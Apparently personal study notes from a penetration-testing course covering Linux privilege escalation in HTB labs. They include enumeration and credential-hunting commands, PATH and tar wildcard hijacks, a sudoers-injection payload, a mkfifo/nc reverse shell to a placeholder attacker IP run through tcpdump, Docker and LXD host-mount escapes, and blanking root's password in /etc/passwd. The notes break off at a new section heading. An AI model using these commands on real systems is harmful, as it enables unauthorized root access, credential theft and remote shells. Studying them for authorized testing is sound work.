
Think of the below as different **security guards** to **identify whether these protections are present**, because they can explain why an exploit or privilege-escalation technique does not work as expected:

```
iptables / UFW → "Should I allow this network connection?"
AppArmor       → "Is this application allowed to do that?"
SELinux        → "Is this action allowed by the security policy?"
Fail2ban       → "Is someone repeatedly behaving suspiciously?"
Snort          → "Does this network traffic look malicious?"
Exec Shield    → "Can I protect against certain memory exploits?"
```


# Section 1, 2 - Initial Enumeration

**You can also use `LinENUM` or `LinEnum` tool for enumeration.**

## Basic Enumeration

Start by finding out **who you are, what system you are on, and what privileges you have**.

| Command                | Description                                    |
| ---------------------- | ---------------------------------------------- |
| `whoami`               | Show the current user                          |
| `id`                   | Show the user's UID, groups, and privileges    |
| `hostname`             | Show the hostname of the machine               |
| `uname -a`             | Show the kernel version and system information |
| `cat /etc/lsb-release` | Show the Linux distribution and version        |
| `cat /etc/os-release`  | Show the operating system and version          |
| `lscpu`                | Show CPU and architecture information          |
| `cat /etc/shells`      | Show the login shells available on the system  |
| `screen -v`            | Check the installed Screen version             |

## Hidden & Interesting Files

Search for **hidden files, directories, and configuration files** that may contain useful information.

| Command                                                                       | Description                                |
| ----------------------------------------------------------------------------- | ------------------------------------------ |
| `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null \| grep htb-student` | Find hidden files related to `htb-student` |
| `find / -type d -name ".*" -ls 2>/dev/null`                                   | Find hidden directories                    |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`             | Find files with `config` in their name     |

## Writable Files & Directories

It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.

|Command|Description|
|---|---|
|`find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`|Find world-writable directories|
|`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`|Find world-writable files|

## SUID / SGID

SUID and SGID programs can run with the **file owner's or group's privileges**. These are important for privilege escalation.

| Command                                                         | Description                                    |
| --------------------------------------------------------------- | ---------------------------------------------- |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find root-owned binaries with the **SUID** bit |
| `find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null` | Find root-owned binaries with the **SGID** bit |

```text
SUID → Program runs with the file owner's privileges
SGID → Program runs with the file group's privileges
```

After finding a SUID/SGID binary, check whether that specific program has a known privilege-escalation technique.


---

# Section 2 - Environment Enumeration Question

**Learn to use REGEX in GREP**

such as: `grep -RIlE 'HTB\{[^}]+\}' / 2>/dev/null`

---
---

# Section 3 - Linux Services & Internals Enumeration

After basic enumeration, look deeper into the **Linux system, users, processes, services, files, network configuration, and installed tools**. The goal is to find credentials, vulnerable software, interesting services, misconfigurations, and possible privilege-escalation paths.

## Network Interfaces

Check the network interfaces, IP addresses, routing table, and local host mappings.

| Command                | Purpose                                                    |
| ---------------------- | ---------------------------------------------------------- |
| `ip a`                 | Show network interfaces and IP addresses.                  |
| `ifconfig`             | Alternative way to show interfaces if `ip` is unavailable. |
| `ip route`             | Show the routing table.                                    |
| `route`                | Alternative way to view routes.                            |
| `netstat -rn`          | Show the routing table using `netstat`.                    |
| `cat /etc/hosts`       | Check local hostname-to-IP mappings.                       |
| `cat /etc/resolv.conf` | Show the DNS server used by the machine                    |
| `arp -a`               | Show nearby hosts stored in the ARP cache                  |

Look for **multiple interfaces, internal IPs, additional routes, and interesting hostnames**. Multiple interfaces can indicate access to another network that your Attack Machine cannot reach directly.

## Users & Groups

Find out who you are, what groups exist, and which users have home directories.

| Command             | Purpose                                                                              |
| ------------------- | ------------------------------------------------------------------------------------ |
| `whoami`            | Show the current username.                                                           |
| `id`                | Show the current user's UID, GID, and groups.                                        |
| `ls /home`          | Show users with home directories.                                                    |
| `ls -la /home`      | Show home directories, including hidden files and permissions.                       |
| `getent group`      | List available groups and their members.                                             |
| `getent group sudo` | Check members of the `sudo` group.                                                   |
| `cat /etc/passwd`   | Show local users and their account information                                       |
| `cat /etc/shadow`   | Show password hashes and password information. Usually requires root/read permission |

## Last Logins

Check which accounts are currently or previously being used.

|Command|Purpose|
|---|---|
|`lastlog`|Show the last login time for users.|
|`who`|Show currently logged-in users.|
|`w`|Show logged-in users and what they are doing.|
|`finger`|Show user information if `finger` is installed.|

This can help identify **interesting accounts, active users, and accounts that are actually being used**.

## Bash History

Command history can contain **passwords, SSH commands, database credentials, scripts, and other useful information**.

| Command                                                                                  | Purpose                                            |
| ---------------------------------------------------------------------------------------- | -------------------------------------------------- |
| `history`                                                                                | Show the current user's command history.           |
| `cat ~/.bash_history`                                                                    | Read the current user's Bash history file.         |
| `history \| grep ssh`                                                                    | Search history for SSH-related commands.           |
| `history \| grep password`                                                               | Search history for password-related commands.      |
| `find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null` | Search for history files belonging to other users. |


## `/proc` Filesystem

`/proc` is a virtual filesystem created by the Linux kernel. It contains information about **running processes, memory, kernel settings, and system activity**.

| Command                                                               | Purpose                                                                                                                                                                                                                               |
| --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `find /proc -name cmdline -exec cat {} \; 2>/dev/null \| tr " " "\n"` | Inspect command lines of running processes.                                                                                                                                                                                           |


This may reveal **usernames, scripts, commands, SSH connections, or other information** associated with running processes.

## Installed Packages

Installed packages can reveal software versions that may have known vulnerabilities.

### 1. Debian / Ubuntu

| Command                                                                                                    | Purpose                                                           |
| ---------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `apt list --installed`                                                                                     | List installed packages.                                          |
| `apt list --installed \| tr "/" " " \| cut -d" " -f1,3 \| sed 's/[0-9]://g' \| tee -a installed_pkgs.list` | Create a cleaner package list for later checks.                   |
| `apt list --upgradable`                                                                                    | Show packages that can be upgraded.                               |
| `apt-cache policy <package>`                                                                               | Check the installed and available versions of a specific package. |

### 2. RPM / DNF

|Command|Purpose|
|---|---|
|`rpm -qa`|List installed RPM packages.|
|`dnf check-update`|Check for available package updates.|

## Sudo

Check both the current user's sudo permissions and the installed sudo version.

|Command|Purpose|
|---|---|
|`sudo -l`|Show commands the current user can run with sudo.|
|`sudo -V`|Show the installed sudo version.|

`sudo -l` is particularly important because it may reveal commands that can be run as **root**.

## Installed Binaries & Tools

Some programs are manually compiled or copied onto the system instead of being installed through a package manager.

|Command|Purpose|
|---|---|
|`ls -l /bin /usr/bin/ /usr/sbin/`|Inspect common binary directories.|
|`which nc`|Check whether Netcat is installed.|
|`which perl`|Check whether Perl is installed.|
|`which python3`|Check whether Python 3 is installed.|
|`which ruby`|Check whether Ruby is installed.|
|`which nmap`|Check whether Nmap is installed.|
|`which tcpdump`|Check whether tcpdump is installed.|
|`which gcc`|Check whether GCC is installed.|

These tools may be useful for **enumeration, file transfer, compilation, or privilege escalation**.

## GTFOBins

[GTFOBins](https://gtfobins.github.io/) contains information about Linux binaries that can sometimes be abused for **privilege escalation, file reads/writes, command execution, and other purposes**. You can compare installed binaries against GTFOBins:

```bash
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
```

If a binary appears, check its GTFOBins entry and whether your **sudo permissions or file permissions** make the technique applicable.

## Running Processes & Services

Check running processes and focus on processes running as root.

| Command               | Purpose                                       |
| --------------------- | --------------------------------------------- |
| `ps aux`              | Show all running processes.                   |
| `ps aux \| grep root` | Show processes running as root.               |
| `lpstat`              | Check printing-related services if installed. |

Pay particular attention to root processes that execute **custom scripts, binaries, or files from unusual or writable locations**.

## Configuration Files

Configuration files can contain **passwords, API keys, usernames, paths, and service settings**.

| Command                                                                                 | Purpose                                                                                                                                                                                                                               |
| --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `find / -type f \( -name "*.conf" -o -name "*.config" \) -exec ls -l {} \; 2>/dev/null` | Find `.conf` and `.config` files and check their permissions.                                                                                                                                                                         |
| `cat /path/to/file.conf`                                                                | Read an interesting configuration file.                                                                                                                                                                                               |
| `ls -la /etc/`                                                                          | Inspect the main `/etc` configuration directory.                                                                                                                                                                                      |
| `ls -la /etc/*/`                                                                        | Inspect common subdirectories under `/etc`.                                                                                                                                                                                           |


## Scripts

Search for shell scripts and inspect anything interesting.

| Command                                                                 | Purpose                                                            |
| ----------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\|snap\|share"` | Find shell scripts while excluding common source/snap/share paths. |
| `cat /path/to/script.sh`                                                | Read an interesting script.                                        |

Pay attention to:

- Passwords or tokens
- Hardcoded paths
- Commands executed as root
- Relative paths
- Writable files or directories
- Backup operations
- Cron-related commands

A script running with higher privileges is especially interesting if your user can modify **the script or something it uses**.

## `strace`

`strace` shows the **system calls made by a program**. It can help identify files, libraries, processes, and network connections used by a program.

|Command|Purpose|
|---|---|
|`strace ping -c1 10.129.112.20`|Trace the system calls made by `ping`.|
|`strace -o trace.txt <command>`|Save the trace output to a file.|

Useful system calls to notice include:

```text
open()
access()
execve()
connect()
read()
write()
```

For example, `open()` can show files being accessed, while `connect()` can reveal network connections.

## Useful File & Directory Checks

Check temporary directories, mounted filesystems, and SSH configuration.

| Command                                      | Purpose                                                                                                                                                                                                                                                        |
| -------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ls -l /tmp /var/tmp /dev/shm`               | Check temporary files. `/tmp` is short-term storage, `/var/tmp` keeps files longer and normally survives reboots, and `/dev/shm` is RAM-backed temporary storage                                                                                               |
| `lsblk`                                      | Show disks and mounted block devices.                                                                                                                                                                                                                          |
| `df -h`                                      | Show filesystem usage and mounted filesystems.                                                                                                                                                                                                                 |
| `cat /etc/fstab`                             | Check filesystem mount configuration. Check **what disks exist, what is mounted, and what is configured to be mounted**. **Mount** → Connect a filesystem to a directory so its files can be accessed. **Unmount** → Disconnect a filesystem from a directory. |
| `cat /etc/fstab \| grep -v "#" \| column -t` | Show `/etc/fstab` without comments in a cleaner format.                                                                                                                                                                                                        |
| `ls -la ~/.ssh`                              | Check the current user's SSH files and permissions.                                                                                                                                                                                                            |



The main goal is to understand **what is installed, what is running, who is running it, what files it uses, and whether your current user can influence any privileged component**.


# Quick Enumeration Script

```
#!/bin/bash
echo "=== LINUX SERVICES & INTERNALS ENUMERATION ==="

echo "[+] Network Interfaces:"
ip a | grep -E "(inet|ens|eth|lo)"

echo "[+] Currently Logged Users:"
w

echo "[+] Running Services (root):"
ps aux | grep root | head -10

echo "[+] Cron Jobs:"
ls -la /etc/cron* 2>/dev/null

echo "[+] SUID Binaries:"
find / -type f -perm -4000 2>/dev/null | head -10

echo "[+] Recent Files:"
find / -type f -mtime -1 2>/dev/null | head -10

echo "[+] Available Tools:"
which python python3 gcc netcat nc curl wget 2>/dev/null

echo "[+] Sudo Version:"
sudo -V 2>/dev/null | head -1

```


---
---

# Section 4 - Credential Hunting

| Command                                                                                                                  | Easy description                                                                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `grep 'DB_USER\|DB_PASSWORD' wp-config.php`                                                                              | Search the WordPress config file for the **database username and password**.                                                                                          |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                                                        | Search the whole system for **files with `config` in the name**. **Skip `/proc` to avoid noisy, temporary process information when searching for real config files.** |
| `ls ~/.ssh`                                                                                                              | List the current user's **SSH files**, including private keys and `known_hosts`.                                                                                      |
| `cat ~/.ssh/known_hosts`                                                                                                 | See the **SSH hosts the user has connected to before**.                                                                                                               |
| `find / -type f \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" \) 2>/dev/null`            | Search the system for **SSH private keys**.                                                                                                                           |
| `find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.xml" -o -name "*.bak" -o -name "*.txt" \) 2>/dev/null` | Search for common **configuration, backup, XML, and text files** that may contain credentials.                                                                        |
| `grep -RiE "password\|passwd\|pwd\|username\|user\|credential\|token" /var/www 2>/dev/null`                              | passwd                                                                                                                                                                |
| `find /var/www -type f 2>/dev/null`                                                                                      | List files under the **web root** to find interesting application files.                                                                                              |
| `find /var/www -type f -name "wp-config.php" 2>/dev/null`                                                                | `wp-config.php` is WordPress's **main configuration file**, but commonly contains database also.                                                                      |
| `ls -la /var/mail /var/spool/mail 2>/dev/null`                                                                           | Check **mail/spool directories** for accessible files that may contain useful information.                                                                            |

---
---

# Section 5 - Path Abuse


Check whether privileged programs run commands **without using the full command path**.

|Command|Description|
|---|---|
|`echo $PATH`|Show the directories Linux searches for commands|
|`PATH=.:${PATH}`|Put the current directory `.` at the beginning of PATH|

Linux checks PATH directories **from left to right**.

**`PATH`** tells Linux **where to look for commands**. For example, when you type `ls`, Linux checks the folders in `$PATH` from **left to right** until it finds the `ls` program, such as `/usr/bin/ls`. You can see the PATH with `echo $PATH`. For example, if your PATH is `/tmp:/usr/bin:/bin`, Linux checks `/tmp` first, then `/usr/bin`, then `/bin`. This matters for **PATH hijacking** because if a root program runs `ls` instead of `/usr/bin/ls`, and you create your own `ls` inside `/tmp`, Linux may run your `/tmp/ls` because `/tmp` comes first in the PATH.

`PATH=.:${PATH}` puts the **current directory (`.`)** at the beginning of the PATH, so Linux checks **wherever you are currently standing** first when looking for a command. For example, if you are in `/tmp` and run `PATH=.:${PATH}`, then `.` means `/tmp`, so Linux checks `/tmp` before the other PATH directories. If a program runs `backup` without specifying its full path, Linux will first look for `/tmp/backup` before checking directories such as `/usr/bin`. Therefore, if you can place a program named `backup` in the current directory, it may be executed instead of the legitimate `backup` program. This is the basic idea behind **PATH hijacking**.

## Example

Check the current `PATH`:

```bash
echo $PATH
```

You can find writable directories in the current `PATH`:

```bash
find $(echo $PATH | tr ':' ' ') -writable -type d 2>/dev/null
```

But if you can write to the **current directory**, you don't need to find a writable PATH directory. You can put the file in the current directory and place `.` first in `PATH`:

```bash
export PATH=.:$PATH
```

Now you can again `echo $PATH` to see if its added. Then Create a fake/replacement or RCE command:

```bash
echo 'echo hi' > ls
chmod +x ls
```

Now:

```bash
ls
```

may execute the local `./ls` because `.` comes **before** the normal command directories in `PATH`.


---
---
# Section 6 - Wildcard Abuse

Wildcard abuse happens when a **privileged command uses `*`**. The shell replaces `*` with the filenames in the current directory. If a filename looks like a command-line option, the program may interpret it as an option.

## Example: `tar`

First, check for privileged cron jobs:

```bash
cat /etc/crontab
```

Suppose you find:

```bash
cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Here, the cron job changes to `/home/htb-student` and then runs `tar` with `*`. Therefore, the specially named files must be created inside `/home/htb-student/` (here `backup.tar.gz` is the **output file** being created by `tar`.)

Go to that directory:

```bash
cd /home/htb-student
```

Create the script (you can include RCE script too!!):


```bash

echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

Create filenames that `tar` will interpret as options:

```bash
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh root.sh"
```

Check that the files were created:

```bash
ls -la
```

When the root cron job runs, `*` includes these filenames, and `tar` interprets them as its own options. The `--checkpoint-action` option causes `tar` to execute `root.sh` with the same privileges as the cron job. After the cron job runs, check the sudo permissions:

```bash
sudo -l
```

 We will see we added sudo privileges and sudo to root directly.


---
---

# Section 7 - Escaping Restricted Shells

A **restricted shell** limits what commands or shell features you can use. Common examples are `rbash`, `rksh`, and `rzsh`. Search online for more techniques.

```
compgen -c
```

This lists commands available to the current Bash shell.
### Command Injection

Try injecting another command through an allowed command's input.

```bash
ls -l `pwd`
```

### Command Substitution

Use backticks or `$()` to execute another command through an allowed input.

```bash
ls $(pwd)
```

### Command Chaining

If shell metacharacters are allowed, try chaining commands with `;`, `&&`, or `|`.

```bash
ls; id
```

### Environment Variables

If the restricted shell allows environment variables to be changed, modifying variables such as `PATH` may bypass restrictions.

```bash
export PATH=/bin:/usr/bin:$PATH
```

### Shell Functions

If shell functions are allowed, a function may be defined to execute another command.

```bash
function test(){ id; }; test
```


## Question

to print out the flag.txt file `echo "$(<flag.txt)"`. if you really want to escape the restricted shell then try starting a remote shell with an unrestricted profile. 

Option 2: 

```
ssh -t htb-user@IP_address bash
```

Here:

- `ssh` → connect to the SSH server.
- `-t` → allocate a pseudo-terminal, so you get an interactive shell.
- `htb-user@IP_address` → your SSH username and target IP.
- `bash` → explicitly ask SSH to start **Bash** instead of the restricted login shell.

---
---

# Section 8 - Special Permissions

Special permissions can sometimes lead to **privilege escalation**. The two important ones are **SUID** and **SGID**.

## 1. Find SUID Files

SUID means a program runs with the permissions of its **file owner**, often `root` (for example, `/usr/bin/passwd`).

```bash

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Look for:

```text
-rwsr-xr-x
```

The `s` means **SUID is enabled**.

Important: finding a SUID file does **not** automatically mean it is exploitable. Check what the program does and whether it has a feature or vulnerability that can be abused. You can use **GTFOBins** for this.


## 2. Find SGID Files

SGID makes a program run with the permissions of its **file group** (for example, a program running with the `docker` group).

```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

Look for:

```text
-rwsr-sr-x
```

The second `s` represents **SGID**. SGID binaries can sometimes be abused in a similar way to SUID binaries.


## 3. Check Interesting Binaries

A **binary** simply means an **executable program/file** (for example, `passwd`, `sudo`, `pkexec`, or a custom program such as `payroll`). If you find something unusual with SID available, for example:

```text
/home/htb-student/shared_obj_hijack/payroll
```

investigate that program. You can check whether the binary is known on **GTFOBins**.


## 4. Example: `apt-get`

If `apt-get` can be run with `sudo`, a configuration option can sometimes be abused:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Here, `apt-get` runs with `sudo` privileges and its `Pre-Invoke` option causes `/bin/sh` to be executed.

---
---

# Section 9 - Sudo Rights Abuse

`sudo -l` shows which commands the current user can run with elevated privileges.

```bash
sudo -l
```

Look for entries such as:

```text
(root) NOPASSWD: /usr/sbin/tcpdump
```

`NOPASSWD` means the command can be run as root **without entering your password**.

## Abuse a Privileged Command

A sudo permission is not automatically exploitable. Check whether the allowed program has features that can execute another command.

For example, `man tcpdump`  shows that it has the  `-z postrotate-command` available,  means: **“After `tcpdump` finishes/rotates a capture file, run this command on that file.”**. If `tcpdump` is allowed as root, create a script containing a reverse shell:

```
cat /tmp/.test
```

Example script:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACK_IP> 443 >/tmp/f
```

Start a listener on the Attack Machine:

```
nc -lnvp 443
```

Then run `tcpdump` with the script as the `-z` post-rotation command:

```

sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

If the system allows this behavior, `tcpdump` executes `/tmp/.test` with its privileged context, giving you a **root reverse shell**.

**NOTE: You can find all this in GTFOBins.** Like I searched for tcmdumo and the commands showed up how to exploit. 


---
---

# Section 10, 14 and 15 - Privileged Groups and Containers 

Certain Linux groups can provide **more access than expected**. Always check the user's groups first: `id` . Containers provide **OS-level isolation**, while virtual machines provide **hardware-level virtualization**. 

## LXD / LXC

A container shares the host's Linux kernel but isolates applications and processes from the rest of the system, while a VM can run a separate operating system. **LXC** provides Linux containers, and **LXD** is a management daemon used to create and manage system containers. For CPTS, the important part is **LXD/LXC privilege escalation**: if your user belongs to a privileged `lxc` or `lxd` group, check what container features you can use with `id`. A **privileged container that has access to the host filesystem** may expose the host's files with root-level privileges. This is why misconfigured LXD/LXC environments can provide a path to elevated access.


| Step                                 | Privileged Groups Chapter                                                      | Container Chapter                                                                     | Description                                                                                                                                          |
| ------------------------------------ | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| **1. Check group membership**        | `id`                                                                           | `id`                                                                                  | Check whether your user belongs to the **`lxc` or `lxd` group**. If you are in one of these groups, investigate the available container permissions. |
| **2. Check / initialize LXD**        | `lxd init`                                                                     | `lxc info`                                                                            | `lxc info` confirms LXD is available and already initialized — if so, skip ahead. Run `lxd init` only when it hasn't been set up yet.                |
| **3. Check available images**        | `lxc image list`                                                               | `lxc image list`                                                                      | Check whether a container image is already available. Do not assume Alpine is already present.                                                       |
| **4. Find an existing image**        | `cd ContainerImages`<br>`ls`                                                   | `cd ContainerImages`<br>`ls`                                                          | Check for container templates already stored on the system. For example, you might find `ubuntu-template.tar.xz`.                                    |
| **5. Import the image**              | `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`             | `lxc image import ubuntu-template.tar.xz --alias ubuntutemp`                          | Import the container image into LXD. Both commands do the same thing; they just use different image files and names.                                 |
| **6. Confirm the image**             | `lxc image list`                                                               | `lxc image list`                                                                      | Check that the imported image now appears in LXD's image list.                                                                                       |
| **7. Create a privileged container** | `lxc init alpine r00t -c security.privileged=true`                             | `lxc init ubuntutemp privesc -c security.privileged=true`                             | Create a new container from the image. `security.privileged=true` makes the container **privileged**, meaning it has weaker isolation from the host. |
| **8. Mount the host filesystem**     | `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` | `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` | Give the container access to the host's `/` filesystem. Inside the container, the host filesystem will appear at `/mnt/root`.                        |
| **9. Start the container**           | `lxc start r00t`                                                               | `lxc start privesc`                                                                   | Start the container. The only difference is the container name.                                                                                      |
| **10. Enter the container**          | `lxc exec r00t /bin/sh`                                                        | `lxc exec privesc /bin/bash`                                                          | Open a shell inside the running container. Ubuntu ships Bash; Alpine only has `/bin/sh` by default.                                                  |
| **11. Check the host filesystem**    | `ls -l /mnt/root`                                                              | `ls -l /mnt/root`                                                                     | Check whether the host's filesystem is visible inside the container.                                                                                 |
| **12. Access host directories**      | `ls -l /mnt/root/root`<br>`ls -l /mnt/root/etc`                                | `ls -l /mnt/root/root`<br>`ls -l /mnt/root/etc`                                       | `/mnt/root` represents the host's `/`. Therefore, `/mnt/root/root` is the host's `/root`, and `/mnt/root/etc` is the host's `/etc`.                  |

---

## Docker

- **Docker** = packs an app + everything it needs into a **container** (a lightweight box that shares the host OS — lighter than a VM).
- **Client** = where you type `docker` commands. **Daemon** = the engine that actually runs containers. They talk via a **socket** (`docker.sock`).
- **Image** = read-only blueprint (recipe). **Container** = a running instance of it (changeable). Changes are lost unless saved to a new image or a **volume**.
- **Docker Compose** = run many containers as one app (`.yml` file). **Docker Desktop** = GUI.

### How to save container changes

|Way|Command|Saves what|Use for|
|---|---|---|---|
|**New image** (`commit`)|`docker commit <container_id> my-new-image:v1`|Whole container state (snapshot)|Installed tools / setup|
|**Volume** (`-v`)|`docker run -v /host/data:/container/data -it ubuntu`|Just the data in that folder|Files/data that keep changing|

> `commit` = take a **photo** of the container. `volume` = plug in a **USB stick** that keeps files no matter what happens to the container.


**Core trick behind ALL attacks:** _Mount the host's `/` into a container you control → read host files as root._ The `-v /:/...` flag is the heart of every escape.

### Option 1. Shared Directory

Host folder mounted inside the container (look for odd dirs like `/hostsystem`). Steal the SSH key → log in.

| #   | Command                                   | What it does                                                           |
| --- | ----------------------------------------- | ---------------------------------------------------------------------- |
| 1   | `ls -la /.dockerenv`                      | Confirm you're in a container (file exists = yes)                      |
| 2   | `mount` _(or `cat /proc/mounts`)_         | List mounts; look for host folders bridged in (e.g. `/hostsystem`)     |
| 3   | `ls -la /`                                | Spot odd non-standard dirs at root (`/hostsystem`, `/host`, `/backup`) |
| 4   | `cd /hostsystem/home/cry0l1t3`            | Go into the mounted host folder                                        |
| 5   | `ls -l`                                   | Spot `.ssh`, `.bash_history`, etc.                                     |
| 6   | `cat .ssh/id_rsa`                         | Read the user's private SSH key                                        |
| 7   | `ssh cry0l1t3@<host IP> -i cry0l1t3.priv` | Save the key (`chmod 600`), then SSH into the host                     |
### Option 2. Docker Socket inside a container

Found a `docker.sock`? Control the daemon = control the host.

| #   | Command                                                                                     | What it does                                                             |
| --- | ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| 1   | `ls -al`                                                                                    | Find the socket: `srw-rw---- ... docker.sock`                            |
| 2   | `which docker`                                                                              | Check if the docker binary is already installed (empty output = missing) |
| 3   | `wget https://<parrot-os>:443/docker -O docker`                                             | Download the docker binary (only if step 2 was empty)                    |
| 4   | `chmod +x docker`                                                                           | Make it runnable                                                         |
| 5   | `/tmp/docker -H unix:///app/docker.sock ps`                                                 | List containers; note the image name (`main_app`)                        |
| 6   | `/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app` | Launch a privileged container mounting host `/` → `/hostsystem`          |
| 7   | `/tmp/docker -H unix:///app/docker.sock ps`                                                 | List again → copy the NEW container ID (`7ae3bcc818af`)                  |
| 8   | `/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash`                    | Drop a shell inside the new container                                    |
| 9   | `cat /hostsystem/root/.ssh/id_rsa`                                                          | Read host root's SSH key                                                 |
### Option 3. User in the `docker` group

In the `docker` group (or docker has SUID, or you can sudo docker) = effectively root.

| #   | Command                                         | What it does                                                   |
| --- | ----------------------------------------------- | -------------------------------------------------------------- |
| 1   | `id`                                            | Check groups; look for `docker` (e.g. `116(docker)`)           |
| 2   | `docker image ls`                               | See which images you can use                                   |
| 3   | `docker run -v /root:/mnt -it ubuntu /bin/bash` | Mount a host dir (here `/root`) into a container, open a shell |
| 4   | `ls /mnt`                                       | Read the mounted host folder                                   |
| 5   | `cat /mnt/.ssh/id_rsa`                          | Grab the SSH key                                               |

> Swap the path for others, e.g. `-v /etc:/mnt`. Or mount the **whole** host `/` (see #4 below) for a full root shell.

### Approach 4. Writable Docker Socket (memorize this one-liner)

`/var/run/docker.sock` writable → instant host root.

| #   | Command                                                                                | What it does                                                                      |
| --- | -------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| 1   | `find / -name docker.sock 2>/dev/null`                                                 | Locate the socket (usually `/var/run/docker.sock`)                                |
| 2   | `ls -l /var/run/docker.sock`                                                           | Check permissions — need a `w` you can use (`srw-rw-rw-`, or you're in its group) |
| 3   | `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash` | Mount host `/` → `/mnt`, `chroot` into it = root shell on the host                |
| 4   | `ls -l`                                                                                | You're now browsing the host's filesystem as root                                 |

**Breakdown of the one-liner:**

| Part                             | Meaning                                      |
| -------------------------------- | -------------------------------------------- |
| `-H unix:///var/run/docker.sock` | Talk to the daemon via the socket            |
| `run ... ubuntu`                 | Start a new container from the ubuntu image  |
| `-v /:/mnt`                      | Mount the host's whole disk into `/mnt`      |
| `chroot /mnt bash`               | Make the host your root → root shell on host |

---

## Disk 

Being in the `disk` group gives direct access to storage devices under `/dev`, which can potentially bypass normal file permissions. Check with `id`, then find devices using `ls -l /dev/sd*`. For an ext filesystem, `debugfs /dev/sda1` can be used to interact directly with the filesystem and potentially access files that the user normally cannot read.

---


## ADM 

Being in the `adm` group usually allows reading system logs under `/var/log`. Check with `id`, then list the logs using `ls -la /var/log` and read useful ones such as `cat /var/log/auth.log` or `cat /var/log/syslog`. This does not directly provide root access, but logs can reveal sensitive information about authentication, users, services, and system activity.

---
---
# Section 11 - Capabilities


Linux **capabilities** give a program specific privileges without giving it full root privileges. They are more fine-grained than simply running a program as `root`.

The security problem happens when a powerful capability is accidentally assigned to an executable. If that executable can be abused, it may allow **privilege escalation**.

## Set Capabilities

`setcap` is used to assign capabilities to an executable. Such as:

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

`cap_net_bind_service` allows the program to bind to **privileged network ports below 1024**.

### Common Dangerous Capabilities

|Capability|Simple meaning|
|---|---|
|`cap_setuid`|Change the process user ID, potentially to `root`|
|`cap_setgid`|Change the process group ID|
|`cap_dac_override`|Bypass normal file read/write/execute permission checks|
|`cap_sys_admin`|Broad administrative privileges, including mounting filesystems|
|`cap_sys_chroot`|Change the process root directory|
|`cap_sys_ptrace`|Attach to/debug other processes|
|`cap_sys_module`|Load/unload kernel modules|
|`cap_net_bind_service`|Bind to ports below 1024|

For CPTS, pay special attention to **`cap_setuid`**, **`cap_dac_override`**, and **`cap_sys_admin`**.

## Capability Values

These values describe **when and how the capability can be used**:

|Value|Simple meaning|
|---|---|
|`=`|Remove the capability / give it no active privileges|
|`+ep`|**Permitted + Effective** → the program is allowed to have the capability and can use it immediately|
|`+ei`|**Effective + Inheritable** → the program can use the capability and pass it to child processes|
|`+p`|**Permitted only** → the program is allowed to have the capability, but it is not active yet|

`+ep` is commonly seen when a binary is given a capability that it should actively use.

## Find Capabilities

Search common binary directories:

```bash

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

You may find something like:

```text
/usr/bin/vim.basic cap_dac_override=eip
```

Check a specific binary:

```bash
getcap /usr/bin/vim.basic
```

The important part is:

```text
cap_dac_override
```

This means the binary can bypass normal filesystem permission checks.

## Example: `cap_dac_override`

Suppose you are a low-privileged user and find:

```text
/usr/bin/vim.basic cap_dac_override=eip
```

Normally, you cannot modify `/etc/passwd`, but `cap_dac_override` can allow the binary to bypass normal file permission checks. You can open the file with:

```bash
/usr/bin/vim.basic /etc/passwd
```

The lab example can also modify it non-interactively:

```bash

echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

Then check:

```bash
cat /etc/passwd | head -n1
```

If the root password field has been removed in the lab, `su` may allow switching to `root` without a password.

---
---

# Section 12 - Vulnerable Services

